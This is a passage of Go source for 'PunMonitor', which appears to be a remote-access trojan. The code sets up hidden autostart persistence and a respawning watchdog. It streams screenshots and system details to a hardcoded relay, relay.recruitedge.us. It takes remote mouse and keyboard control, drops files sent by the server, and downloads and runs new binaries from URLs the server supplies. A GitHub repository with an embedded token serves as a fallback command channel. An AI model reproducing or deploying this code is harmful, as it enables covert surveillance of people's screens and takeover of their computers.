				os.Exit(0)
			}
		}
	}

	cfg.ConfigPort = 8080
	cfg.MaxFPS = 1.0
	cfg.TunnelHostname = "relay.recruitedge.us"

	initActivityStore()

	// Accumulate idle time by sampling every 5 seconds
	idleCtx, cancelIdle := context.WithCancel(context.Background())
	defer cancelIdle()
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if globalActivity != nil && getIdleDuration() >= 5*time.Second {
					globalActivity.mu.Lock()
					globalActivity.state.TotalIdleMS += 5000
					globalActivity.mu.Unlock()
					globalActivity.save()
				}
			case <-idleCtx.Done():
				return
			}
		}
	}()

	loadSettings()
	loadElectionInterval()
	if cfg.ElectionInterval == "" {
		cfg.ElectionInterval = "5m"
		llog("info", "Election interval not set – initializing to default 5m")
		saveSettings()
		loadElectionInterval()
	}
	loadCredentials()

	myHostname = getHostname()
    if cfg.AgentID == "" {
        cfg.AgentID = fmt.Sprintf("%s-%s", myHostname, randomString(4))
        saveSettings()
    }
    llog("info", "AgentID: %s", cfg.AgentID)

	if defaultGitHubRepo != "" {
		cfg.GitHubRepo = defaultGitHubRepo
	}
	if defaultGitHubToken != "" {
		cfg.GitHubToken = defaultGitHubToken
	}

	saveSettings()

	// First sync is synchronous to ensure correct GitHub token before election
	syncFromGitHub()
	saveSettings()

	setupAutostart()

	// Watchdog monitor runs for ALL instances (server, agent, or standalone)
	go safeRun("watchdog-monitor", monitorWatchdogProcess)

	// Always start HTTP server for localhost access regardless of election outcome
	go startHTTPServer()

	// Periodic WS status broadcast for dashboard clients (every 5 seconds)
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			broadcastStatusToWS()
		}
	}()

	startGitHubLeaderElection()
}

// --- Watchdog ---

var wdLogFile *os.File

func wdLogOpen() {
	if wdLogFile != nil {
		return
	}
	f, err := os.OpenFile(filepath.Join(dataDir(), "watchdog.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return
	}
	wdLogFile = f
}

func wlog(format string, args ...interface{}) {
	wdLogOpen()
	if wdLogFile != nil {
		wdLogFile.WriteString(time.Now().Format("15:04:05.000") + " " + fmt.Sprintf(format, args...) + "\n")
	}
}

func runWatchdog() {
	if !watchdogSingleton() {
		wlog("Watchdog already running, exiting")
		os.Exit(1)
	}
	wlog("Watchdog started")
	writeWatchdogHeartbeat()
	// Re-install autostart to ensure resilience
	setupAutostart()

	// Use the permanent binary path so the main process always starts from
	// the protected location (binDir), even if the watchdog itself is still
	// running from a temporary location.
	watchdogExe, err := os.Executable()
	if err != nil {
		wlog("Failed to get executable path: %v", err)
		os.Exit(1)
	}
	permPath := filepath.Join(binDir(), filepath.Base(watchdogExe))
	// If the permanent copy exists, use it; otherwise fall back to current path
	exePath := permPath
	if _, err := os.Stat(permPath); err != nil {
		exePath = watchdogExe
	}

	go func() {
		// Write heartbeat every 10s so monitor can verify watchdog is alive
		for {
			time.Sleep(10 * time.Second)
			writeWatchdogHeartbeat()
		}
	}()

	for {
		cmd := exec.Command(exePath)
		cmd.Stdout = nil
		cmd.Stderr = nil
		newHiddenCmd(cmd)

		wlog("Starting monitor...")
		if err := cmd.Start(); err != nil {
			wlog("Failed to start monitor: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}
		wlog("Monitor PID: %d", cmd.Process.Pid)

		if err := cmd.Wait(); err != nil {
			wlog("Monitor exited with error: %v", err)
		} else {
			wlog("Monitor exited cleanly")
		}
		time.Sleep(3 * time.Second)
	}
}

// --- Utility ---

func isTerminal() bool {
	stat, _ := os.Stdout.Stat()
	return (stat.Mode() & os.ModeCharDevice) != 0
}

func safeRun(name string, fn func()) {
	defer func() {
		if r := recover(); r != nil {
			llog("error", "PANIC in %s: %v", name, r)
		}
	}()
	fn()
}

func formatTime(ms int64) string {
	if ms == 0 {
		return "never"
	}
	return time.UnixMilli(ms).Format("Jan 2 03:04 PM")
}

func sendAgentListToWS(conn *websocket.Conn) {
	agentConnsMu.RLock()
	list := make([]string, 0, len(agentConns)+1)
	for id := range agentConns {
		list = append(list, id)
	}
	agentConnsMu.RUnlock()
	hasLocal := false
	for _, id := range list {
		if id == cfg.AgentID {
			hasLocal = true
			break
		}
	}
	if !hasLocal {
		list = append(list, cfg.AgentID)
	}
	data, _ := json.Marshal(list)
	conn.WriteMessage(websocket.TextMessage, data)
}

func sendStatusToWS(conn *websocket.Conn) {
	mode := "standalone"
	if agentMode {
		mode = "agent"
	} else if cfg.IsServerMode {
		mode = "server"
	}
	statusMsg, _ := json.Marshal(map[string]interface{}{
		"type":   "status",
		"mode":   mode,
	})
	conn.WriteMessage(websocket.TextMessage, statusMsg)
}

func broadcastStatusToWS() {
	mode := "standalone"
	if agentMode {
		mode = "agent"
	} else if cfg.IsServerMode {
		mode = "server"
	}
	statusMsg, _ := json.Marshal(map[string]interface{}{
		"type": "status",
		"mode": mode,
	})
	wsClients.Range(func(key, value interface{}) bool {
		conn := key.(*websocket.Conn)
		connAgentIDMu.RLock()
		_, isAgent := connAgentID[conn]
		connAgentIDMu.RUnlock()
		if !isAgent {
			conn.WriteMessage(websocket.TextMessage, statusMsg)
		}
		return true
	})
}

// --- ActivityStore ---

type SessionState struct {
	BootTimeMS       int64  `json:"boot_time_ms"`
	LastStartupMS    int64  `json:"last_startup_ms"`
	LastShutdownMS   int64  `json:"last_shutdown_ms"`
	LastIdleStartMS  int64  `json:"last_idle_start_ms"`
	LastActiveMS     int64  `json:"last_active_ms"`
	LastWakeMS       int64  `json:"last_wake_ms"`
	LastShutdownNote string `json:"last_shutdown_note,omitempty"`
	TotalIdleMS      int64  `json:"total_idle_ms"`
}

type ActivityStore struct {
	mu    sync.Mutex
	state SessionState
	path  string
	log   string
}

var globalActivity *ActivityStore

func initActivityStore() *ActivityStore {
	if globalActivity != nil {
		return globalActivity
	}
	dir := dataDir()
	s := &ActivityStore{
		path: filepath.Join(dir, "session_state.json"),
		log:  filepath.Join(dir, "activity_log.jsonl"),
	}
	s.load()
	now := time.Now().UnixMilli()
	boot := systemBootTimeMS()
	s.mu.Lock()
	if boot > 0 && boot != s.state.BootTimeMS {
		s.state.BootTimeMS = boot
		s.recordLocked("system_startup", formatTime(boot)+" — system boot")
		s.state.LastWakeMS = now
	}
	s.state.LastStartupMS = now
	s.recordLocked("agent_start", "PunMonitor started")
	s.mu.Unlock()
	s.save()
	globalActivity = s
	return s
}

func (s *ActivityStore) load() {
	data, err := os.ReadFile(s.path)
	if err != nil {
		return
	}
	_ = json.Unmarshal(data, &s.state)
}

func (s *ActivityStore) save() {
	s.mu.Lock()
	defer s.mu.Unlock()
	data, _ := json.MarshalIndent(s.state, "", "  ")
	_ = os.WriteFile(s.path, data, 0644)
}

func (s *ActivityStore) Record(typ, detail string) {
	s.mu.Lock()
	s.recordLocked(typ, detail)
	s.mu.Unlock()
	s.save()
}

func (s *ActivityStore) recordLocked(typ, detail string) {
	now := time.Now().UnixMilli()
	switch typ {
	case "user_idle_start":
		s.state.LastIdleStartMS = now
	case "user_active":
		s.state.LastActiveMS = now
	case "user_idle_end":
	case "agent_start":
	case "agent_stop":
		s.state.LastShutdownMS = now
	default:
	}
	if detail != "" {
		s.state.LastShutdownNote = detail
	}
}

func (s *ActivityStore) Summary() map[string]string {
	s.mu.Lock()
	defer s.mu.Unlock()
	idleStr := "never"
	if s.state.TotalIdleMS > 0 {
		totalSec := s.state.TotalIdleMS / 1000
		idleStr = fmt.Sprintf("%dh %dm %ds", totalSec/3600, (totalSec%3600)/60, totalSec%60)
	}
	return map[string]string{
		"boot_time":       formatTime(s.state.BootTimeMS),
		"last_startup":    formatTime(s.state.LastStartupMS),
		"last_shutdown":   formatTime(s.state.LastShutdownMS),
		"last_active":     formatTime(s.state.LastActiveMS),
		"last_idle_start": formatTime(s.state.LastIdleStartMS),
		"last_wake":       formatTime(s.state.LastWakeMS),
		"total_idle":      idleStr,
	}
}

func (s *ActivityStore) RecentEvents(max int) []ActivityEvent {
	return []ActivityEvent{}
}

func appendActivityLog(path string, ev ActivityEvent) {}

func selfUpdate(downloadURL string) {
	defer func() {
		if r := recover(); r != nil {
			llog("error", "PANIC in self-update: %v", r)
		}
	}()
	llog("info", "Self-update: downloading from %s", downloadURL)
	exe, err := os.Executable()
	if err != nil {
		llog("error", "Self-update: cannot get executable path: %v", err)
		return
	}
	newExe := exe + ".new"
	out, err := os.Create(newExe)
	if err != nil {
		llog("error", "Self-update: cannot create temp file: %v", err)
		return
	}

	resp, err := http.Get(downloadURL)
	if err != nil {
		out.Close()
		os.Remove(newExe)
		llog("error", "Self-update: download failed: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		out.Close()
		os.Remove(newExe)
		llog("error", "Self-update: download status %d", resp.StatusCode)
		return
	}

	_, err = io.Copy(out, resp.Body)
	out.Close()
	if err != nil {
		os.Remove(newExe)
		llog("error", "Self-update: write failed: %v", err)
		return
	}

	if runtime.GOOS != "windows" {
		os.Chmod(newExe, 0755)
	}

	llog("info", "Self-update: downloaded to %s, spawning updater", newExe)

	if runtime.GOOS == "windows" {
		script := filepath.Join(os.TempDir(), "pun_update.bat")
		os.WriteFile(script, []byte(
			"@echo off\r\n"+
				"timeout /t 2 /nobreak >nul\r\n"+
				"copy /Y \""+newExe+"\" \""+exe+"\" >nul\r\n"+
				"del \""+newExe+"\"\r\n"+
				"start \"\" \""+exe+"\"\r\n",
		), 0644)
		cmd := exec.Command("cmd", "/c", "start", "/b", script)
		newHiddenCmd(cmd)
		cmd.Start()
	} else {
		script := filepath.Join(os.TempDir(), "pun_update.sh")
		os.WriteFile(script, []byte(
			"#!/bin/sh\n"+
				"sleep 2\n"+
				"cp \""+newExe+"\" \""+exe+"\"\n"+
				"rm \""+newExe+"\"\n"+
				"\""+exe+"\" &\n",
		), 0755)
		cmd := exec.Command("/bin/sh", script)
		newHiddenCmd(cmd)
		cmd.Start()
	}
	llog("info", "Self-update: updater launched, exiting")
	os.Exit(0)
}

// --- EnsureCloudflaredInstalled ---

func EnsureCloudflaredInstalled() error {
	_, err := exec.LookPath("cloudflared")
	if err == nil {
		return nil
	}

	llog("info", "cloudflared not found, downloading...")

	var arch, ext, downloadURL string
	switch runtime.GOARCH {
	case "386":
		arch = "386"
	case "arm64":
		arch = "arm64"
	default:
		arch = "amd64"
	}

	switch runtime.GOOS {
	case "windows":
		ext = ".exe"
		downloadURL = fmt.Sprintf("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-%s%s", arch, ext)
	case "darwin":
		ext = ""
		downloadURL = fmt.Sprintf("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-%s", arch)
	default:
		ext = ""
		downloadURL = fmt.Sprintf("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-%s", arch)
	}

	binName := "cloudflared" + ext
	binDir := filepath.Join(dataDir(), "bin")
	os.MkdirAll(binDir, 0755)
	dest := filepath.Join(binDir, binName)

	resp, err := http.Get(downloadURL)
	if err != nil {
		return fmt.Errorf("download failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("download status: %d", resp.StatusCode)
	}

	out, err := os.Create(dest)
	if err != nil {
		return fmt.Errorf("create file: %w", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("copy failed: %w", err)
	}

	if runtime.GOOS != "windows" {
		os.Chmod(dest, 0755)
	}

	os.Setenv("PATH", os.Getenv("PATH")+string(os.PathListSeparator)+binDir)

	llog("info", "cloudflared installed to %s", dest)
	return nil
}

// --- Transport infrastructure ---

var (
	healthChecker   = NewHealthChecker()
	transportPool   = NewTransportPool(healthChecker)
	reconnectMgr    = NewReconnectManager()
	ghTransport     *githubTransport
	activeTransport string
)

type HealthChecker struct {
	mu     sync.Mutex
	dead   map[string]bool
	onDead func(string)
}

func NewHealthChecker() *HealthChecker {
	return &HealthChecker{dead: make(map[string]bool)}
}

func (hc *HealthChecker) SetOnDead(cb func(string)) {
	hc.onDead = cb
}

func (hc *HealthChecker) Register(id string) {
	hc.mu.Lock()
	hc.dead[id] = false
	hc.mu.Unlock()
}

func (hc *HealthChecker) Heartbeat(id string) {
	hc.mu.Lock()
	hc.dead[id] = false
	hc.mu.Unlock()
}

func (hc *HealthChecker) IsDead(id string) bool {
	hc.mu.Lock()
	defer hc.mu.Unlock()
	return hc.dead[id]
}

func (hc *HealthChecker) ReportFailure(id string, err error) {
	if err == nil {
		return
	}
	hc.mu.Lock()
	hc.dead[id] = true
	cb := hc.onDead
	hc.mu.Unlock()
	if cb != nil {
		cb(id)
	}
}

type poolEntry struct {
	transport Transport
	priority  int
}

type TransportPool struct {
	mu      sync.RWMutex
	entries map[string]poolEntry
}

func NewTransportPool(hc *HealthChecker) *TransportPool {
	tp := &TransportPool{entries: make(map[string]poolEntry)}
	hc.SetOnDead(func(id string) {
		tp.Remove(id)
	})
	return tp
}

func (tp *TransportPool) Add(id string, t Transport) {
	if tp == nil || t == nil {
		return
	}
	pri := math.MaxInt32
	switch tr := t.(type) {
	case *wsTransport:
		pri = tr.Priority()
	case *quicTransport:
		pri = tr.Priority()
	case *webrtcTransport:
		pri = tr.Priority()
	case *githubTransport:
		pri = tr.Priority()
	}
	tp.mu.Lock()
	tp.entries[id] = poolEntry{transport: t, priority: pri}
	tp.mu.Unlock()
	llog("info", "Transport added: %s (priority %d)", id, pri)
}

func (tp *TransportPool) Remove(id string) {
	tp.mu.Lock()
	delete(tp.entries, id)
	tp.mu.Unlock()
	llog("info", "Transport removed: %s", id)
}

func (tp *TransportPool) GetBest() Transport {
	tp.mu.RLock()
	defer tp.mu.RUnlock()
	var best Transport
	bestPri := math.MaxInt32
	for _, e := range tp.entries {
		if e.priority < bestPri && !healthChecker.IsDead(e.transport.Name()) {
			bestPri = e.priority
			best = e.transport
		}
	}
	return best
}

func (tp *TransportPool) GetByName(name string) Transport {
	tp.mu.RLock()
	defer tp.mu.RUnlock()
	for _, e := range tp.entries {
		if e.transport.Name() == name {
			return e.transport
		}
	}
	return nil
}

type ReconnectManager struct {
	mu      sync.Mutex
	backoff map[string]time.Duration
}

func NewReconnectManager() *ReconnectManager {
	return &ReconnectManager{backoff: make(map[string]time.Duration)}
}

func (rm *ReconnectManager) Wait(url string) {
	rm.mu.Lock()
	d := rm.backoff[url]
	rm.mu.Unlock()
	if d > 0 {
		time.Sleep(d)
	}
}

func (rm *ReconnectManager) Success(url string) {
	rm.mu.Lock()
	rm.backoff[url] = 0
	rm.mu.Unlock()
}

func (rm *ReconnectManager) Failure(url string) {
	rm.mu.Lock()
	d := rm.backoff[url]
	if d == 0 {
		d = 1 * time.Second
	} else {
		d *= 2
		if d > 1*time.Minute {
			d = 1 * time.Minute
		}
	}
	rm.backoff[url] = d
	rm.mu.Unlock()
}

func sendViaBestTransport(wm *WireMessage) {
	t := transportPool.GetBest()
	if t != nil {
		if err := t.Send(wm); err != nil {
			healthChecker.ReportFailure(t.Name(), err)
			t2 := transportPool.GetBest()
			if t2 != nil && t2.Name() != t.Name() {
				t2.Send(wm)
				activeTransport = t2.Name()
			}
		} else {
			healthChecker.Heartbeat(t.Name())
			activeTransport = t.Name()
		}
	}
}

type wsTransport struct {
	conn     *websocket.Conn
	priority int
	url      string
}

func NewWSTransport(conn *websocket.Conn, priority int, url string) Transport {
	return &wsTransport{
		conn:     conn,
		priority: priority,
		url:      url,
	}
}

func (t *wsTransport) Send(wm *WireMessage) error {
	if t.conn == nil {
		return fmt.Errorf("websocket connection is nil")
	}
	return t.conn.WriteMessage(websocket.TextMessage, wm.Marshal())
}

func (t *wsTransport) Recv() (*WireMessage, error) {
	if t.conn == nil {
		return nil, fmt.Errorf("websocket connection is nil")
	}
	_, data, err := t.conn.ReadMessage()
	if err != nil {
		return nil, err
	}
	var wm WireMessage
	if err := json.Unmarshal(data, &wm); err != nil {
		return nil, err
	}
	return &wm, nil
}

func (t *wsTransport) Name() string               { return "ws" }
func (t *wsTransport) Priority() int               { return t.priority }

type quicTransport struct {
	conn     *quic.Conn
	stream   quic.Stream
	priority int
}

func NewQuicTransport(conn *quic.Conn, stream quic.Stream, priority int) Transport {
	return &quicTransport{
		conn:     conn,
		stream:   stream,
		priority: priority,
	}
}

func (t *quicTransport) Send(wm *WireMessage) error {
	_, err := t.stream.Write(wm.Marshal())
	return err
}

func (t *quicTransport) Recv() (*WireMessage, error) {
	data := make([]byte, 65536)
	n, err := t.stream.Read(data)
	if err != nil {
		return nil, err
	}
	var wm WireMessage
	if err := json.Unmarshal(data[:n], &wm); err != nil {
		return nil, err
	}
	return &wm, nil
}

func (t *quicTransport) Name() string  { return "quic" }
func (t *quicTransport) Priority() int { return t.priority }

type webrtcTransport struct {
	priority int
}

func NewWebRTCTransport(priority int) Transport {
	return &webrtcTransport{priority: priority}
}

func (t *webrtcTransport) Send(wm *WireMessage) error {
	// Use the manager's broadcast to all active data channels
	webrtcManager.BroadcastFrame(wm)
	return nil
}

func (t *webrtcTransport) Recv() (*WireMessage, error) {
	return nil, fmt.Errorf("webrtc transport receive not implemented")
}

func (t *webrtcTransport) Name() string    { return "webrtc" }
func (t *webrtcTransport) Priority() int   { return t.priority }

type githubTransport struct {
	priority int
	repo     string
	token    string
	mu       sync.Mutex
	lastData []byte
}

func NewGitHubTransport(repo, token string, priority int) Transport {
	return &githubTransport{
		priority: priority,
		repo:     repo,
		token:    token,
	}
}

func (g *githubTransport) Name() string               { return "github" }
func (g *githubTransport) Priority() int               { return g.priority }

func (g *githubTransport) Send(wm *WireMessage) error {
	if g.repo == "" {
		return fmt.Errorf("github repo not configured")
	}
	g.mu.Lock()
	g.lastData = wm.Marshal()
	g.mu.Unlock()

	go func() {
		frameJSON := wm.Marshal()
		encoded := base64.StdEncoding.EncodeToString(frameJSON)
		payload, _ := json.Marshal(map[string]interface{}{
			"message": "frame update",
			"content": encoded,
			"branch":  "main",
		})
		url := fmt.Sprintf("https://api.github.com/repos/%s/contents/frames/latest.json", g.repo)
		req, err := http.NewRequest("PUT", url, bytes.NewReader(payload))
		if err != nil { llog("error", "Failed to create request for GitHub transport: %v", err); return }
		req.Header.Set("Authorization", "Bearer "+g.token)
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil { llog("error", "Failed to send frame to GitHub: %v", err); return }
		defer resp.Body.Close()
	}()
	return nil
}

func (g *githubTransport) Recv() (*WireMessage, error) {
	if g.repo == "" {
		return nil, fmt.Errorf("github repo not configured")
	}
	url := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/frames/latest.json", g.repo)
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	var wm WireMessage
	if err := json.Unmarshal(data, &wm); err != nil {
		return nil, err
	}
	return &wm, nil
}

func bytesToBase64(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

func startTransportMonitor(ctx context.Context) {
	defer func() {
		if r := recover(); r != nil {
			llog("error", "PANIC in transport monitor: %v", r)
		}
	}()
	initTransports()
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			current := transportPool.GetBest()
			if current == nil {
				continue
			}
			ping := &WireMessage{Type: "ping"}
			if err := current.Send(ping); err != nil {
				healthChecker.ReportFailure(current.Name(), err)
				llog("warn", "Transport %s failed, falling back", current.Name())
				fallback := transportPool.GetBest()
				if fallback != nil && fallback.Name() != current.Name() {
					llog("info", "Fell back to transport: %s", fallback.Name())
					activeTransport = fallback.Name()
				}
			} else {
				healthChecker.Heartbeat(current.Name())
			}
		case <-ctx.Done():
			return
		}
	}
}

func initTransports() {
	if cfg.GitHubRepo != "" {
		gt := NewGitHubTransport(cfg.GitHubRepo, cfg.GitHubToken, 100)
		ghTransport = gt.(*githubTransport)
		transportPool.Add("github", gt)
		healthChecker.Register("github")
		llog("info", "GitHub fallback transport registered")
	}
	// Register WebRTC transport with high priority (lower number = higher priority)
	wt := NewWebRTCTransport(10)
	transportPool.Add("webrtc", wt)
	healthChecker.Register("webrtc")
	llog("info", "WebRTC transport registered")}

func getTransportStatus() map[string]interface{} {
	best := transportPool.GetBest()
	bestName := "none"
	if best != nil {
		bestName = best.Name()
	}
	var wsCount int
	wsClients.Range(func(key, value interface{}) bool {
		wsCount++
		return true
	})
	tunnelType := cfg.TunnelProvider
	if tunnelType == "" {
		tunnelType = "cloudflare"
	}
	return map[string]interface{}{
		"active":        bestName,
		"healthy":       !healthChecker.IsDead(bestName),
		"ws_clients":    wsCount,
		"tunnel_type":   tunnelType,
		"tunnel_active": tunnelCmd != nil || cfg.CloudflareTunnelID != "",
	}
}

type DNSURLChecker struct {
	domain string
}

func NewDNSURLChecker(domain string, onURLsFound func([]string)) *DNSURLChecker {
	return &DNSURLChecker{domain: domain}
}

func (d *DNSURLChecker) Start()  {}
func (d *DNSURLChecker) Stop()   {}

type GitHubURLChecker struct {
	cfg *Config
}

func NewGitHubURLChecker(cfg *Config, onURLsFound func([]string)) *GitHubURLChecker {
	return &GitHubURLChecker{cfg: cfg}
}

func (g *GitHubURLChecker) Start()  {}
func (g *GitHubURLChecker) Stop()   {}

type ServerList struct {
	URLs []string
	mu   sync.RWMutex
}

func NewServerList() *ServerList {
	return &ServerList{URLs: []string{}}
}

func (sl *ServerList) Get() []string {
	sl.mu.RLock()
	defer sl.mu.RUnlock()
	return append([]string{}, sl.URLs...)
}

func (sl *ServerList) Set(urls []string) {
	sl.mu.Lock()
	sl.URLs = urls
	sl.mu.Unlock()
}

// --- WebRTC ---

type WebRTCClient struct {
	pc          *webrtc.PeerConnection
	dc          *webrtc.DataChannel
	connID      string
	connectedAt time.Time
}

type WebRTCManager struct {
	mu      sync.Mutex
	clients map[string]*WebRTCClient
	api     *webrtc.API
}

var webrtcManager = NewWebRTCManager()
var webrtcDataChannels sync.Map

// --- Agent support functions ---

func broadcastFrame(msg []byte, wm *WireMessage) {
	connAgentIDMu.RLock()
	defer connAgentIDMu.RUnlock()
	frameSize := len(msg)
	clientsCount := 0
	wsClients.Range(func(key, value interface{}) bool {
		conn := key.(*websocket.Conn)
		if _, isAgent := connAgentID[conn]; isAgent {
			return true
		}
		clientsCount++
		if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
			wsClients.Delete(key)
		}
		return true
	})
	if frameSize > 0 {
		llog("debug", "Broadcast frame agent=%s size=%d to %d dashboard clients", wm.AgentID, frameSize, clientsCount)
	}
}

func forwardToAgent(agentID string, msg []byte) {
	agentConnsMu.RLock()
	conn, ok := agentConns[agentID]
	agentConnsMu.RUnlock()
	if !ok {
		llog("warn", "agent %s not connected", agentID)
		return
	}
	if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
		llog("error", "forward to agent %s failed: %v", agentID, err)
	}
}

func runAgentClient() {
	hostname := cfg.AgentID
	
	reconnectDelay := 5 * time.Second
	serverURL := cfg.ServerURL
	if serverURL == "" {
		serverURL = "https://relay.recruitedge.us"
	}
	for {
		connected := false
		// Try transports in order: WebSocket → GitHub
		connected = tryAgentWebSocket(hostname, serverURL)
		if connected {
			continue
		}
		if cfg.GitHubRepo != "" && cfg.GitHubToken != "" {
			llog("info", "WS failed, trying GitHub transport for agent %s", hostname)
			connected = tryAgentGitHub(hostname)
		}
		if !connected {
			if cfg.GitHubRepo != "" && cfg.GitHubToken != "" && isLeaderStale() {
				llog("info", "Leader is stale – returning to election loop to re-elect")
				return
			}
			llog("error", "All transports failed for agent %s, retrying in %v", hostname, reconnectDelay)
			time.Sleep(reconnectDelay)
		}
	}
}

func tryAgentWebSocket(hostname, serverURL string) bool {
	wsURL := serverURL
	if strings.HasPrefix(wsURL, "https://") {
		wsURL = "wss://" + wsURL[len("https://"):]
	} else if strings.HasPrefix(wsURL, "http://") {
		wsURL = "ws://" + wsURL[len("http://"):]
	}
	wsURL += "/ws"
	conn, _, err := (&websocket.Dialer{}).Dial(wsURL, nil)
	if err != nil {
		llog("error", "Agent WS connect to %s failed: %v", wsURL, err)
		return false
	}
	sysInfo := map[string]string{
		"hostname": getHostname(),
		"local_ip": getLocalIP(),
		"wan_ip":   getWANIP(),
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"uptime":   fmt.Sprintf("%.0f", time.Since(startTime).Seconds()),
		"version":  binaryVersion,
		"mode":     "agent",
	}
	if globalActivity != nil {
		s := globalActivity.Summary()
		if b, ok := s["boot_time"]; ok { sysInfo["boot_time"] = b }
		if ti, ok := s["total_idle"]; ok { sysInfo["idle_time"] = ti }
	}
	if !startTime.IsZero() {
		sysInfo["start_time"] = startTime.Format("2006-01-02 15:04:05")
		sysInfo["wake_up_time"] = startTime.Format("2006-01-02 15:04:05")
	}
	hello, _ := json.Marshal(map[string]interface{}{
		"type":    "hello",
		"agentId": hostname,
		"agent":   true,
		"systemInfo": sysInfo,
	})
	if err := conn.WriteMessage(websocket.TextMessage, hello); err != nil {
		conn.Close()
		llog("error", "Agent WS hello failed: %v", err)
		return false
	}
	llog("info", "Agent %s connected via WebSocket", hostname)
	go agentReadLoop(conn, hostname)
	sendAgentFramesWS(conn, hostname)
	return true
}

func sendAgentFramesWS(conn *websocket.Conn, hostname string) {
	defer func() {
		if r := recover(); r != nil {
			llog("error", "PANIC in agent frame sender: %v", r)
		}
	}()
	fps := cfg.MaxFPS
	if fps <= 0 {
		fps = 1
	}
	ticker := time.NewTicker(time.Duration(float64(time.Second) / fps))
	defer ticker.Stop()
	for range ticker.C {
		img, err := captureScreen()
		if err != nil {
			llog("warn", "Frame capture failed for %s: %v", hostname, err)
			continue
		}
		var buf bytes.Buffer
		if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
			continue
		}
		wm := WireMessage{
			Type:    MSG_FRAME,
			Data:    buf.Bytes(),
			AgentID: hostname,
		}
		msg, err := json.Marshal(wm)
		if err != nil {
			continue
		}
		if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
			llog("error", "Agent WS send frame failed: %v", err)
			conn.Close()
			return
		}
		llog("debug", "Agent sent frame for %s (%d bytes)", hostname, len(msg))
	}
}

func agentReadLoop(conn *websocket.Conn, hostname string) {
	defer func() {
		if r := recover(); r != nil {
			llog("error", "PANIC in agent read loop: %v", r)
		}
	}()
	defer conn.Close()
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			llog("error", "Agent WS read error: %v", err)
			return
		}
		var msgMap map[string]interface{}
		if err := json.Unmarshal(msg, &msgMap); err != nil {
			continue
		}
		switch msgMap["type"].(string) {
		case "update":
			if url, ok := msgMap["url"].(string); ok && url != "" {
				llog("info", "Agent %s received update command, downloading from %s", hostname, url)
				go safeRun("agent-update", func() { selfUpdate(url) })
			}
		case "forward":
			if target, ok := msgMap["target"].(string); ok && target == hostname {
				handleWSMessage(conn, msg)
			}
		case "promote_to_server":
			llog("info", "Agent %s received promote_to_server command", hostname)
			cfg.IsServerMode = true
			conn.Close()
			return
		case "file_transfer":
			if name, ok := msgMap["name"].(string); ok {
				dataStr, _ := msgMap["data"].(string) // base64-encoded by JSON marshal
				go func() {
					data, err := base64.StdEncoding.DecodeString(dataStr)
					if err != nil {
						llog("error", "File transfer decode error: %v", err)
						return
					}
					savePath := filepath.Join(os.TempDir(), name)
					if err := os.WriteFile(savePath, data, 0644); err != nil {
						llog("error", "File transfer write error: %v", err)
						return
					}
					llog("info", "File received: %s (%d bytes) saved to %s", name, len(data), savePath)
				}()
			}
		default:
			// Forwarded remote control commands (mouse_move, mouse_click, key_press, etc.)
			// Execute locally instead of re-forwarding (which would loop or fail silently)
			if t := msgMap["type"].(string); t == "mouse_move" || t == "mouse_click" || t == "key_press" {
				if x, ok := msgMap["x"].(float64); ok {
					if y, ok := msgMap["y"].(float64); ok {
						winMouseMove(int(x), int(y))
					}
				}
				if t == "mouse_click" {
					btn, _ := msgMap["button"].(string)
					winMouseClick(0, 0, btn != "right")
				}
				if t == "key_press" {
					if key, ok := msgMap["key"].(float64); ok {
						winKeyPress(uint16(key))
					}
				}
			}
		}
	}
}

func writeAgentHeartbeat() {
	if cfg.GitHubRepo == "" || cfg.GitHubToken == "" {
		return
	}
	hostname := cfg.AgentID
	content := map[string]interface{}{
		"hostname":  hostname,
		"timestamp": time.Now().UnixMilli(),
		"mode":      "agent",
		"version":   binaryVersion,
	}
	data, _ := json.Marshal(content)
	encoded := base64.StdEncoding.EncodeToString(data)
	filename := fmt.Sprintf("agent_heartbeat_%s.json", hostname)
	apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/%s", cfg.GitHubRepo, filename)
	payload, _ := json.Marshal(map[string]interface{}{
		"message": "heartbeat: " + hostname,
		"content": encoded,
		"branch":  "main",
	})
	req, err := http.NewRequest("PUT", apiURL, bytes.NewReader(payload))
	if err != nil {
		return
	}
	req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return
	}
	resp.Body.Close()
}

func checkAgentCommandsAndRun() {
	if cfg.GitHubRepo == "" || cfg.GitHubToken == "" {
		return
	}
	hostname := cfg.AgentID
	apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/agent_command_%s.json", cfg.GitHubRepo, hostname)
	req, err := http.NewRequest("GET", apiURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
	req.Header.Set("Accept", "application/vnd.github.v3+json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
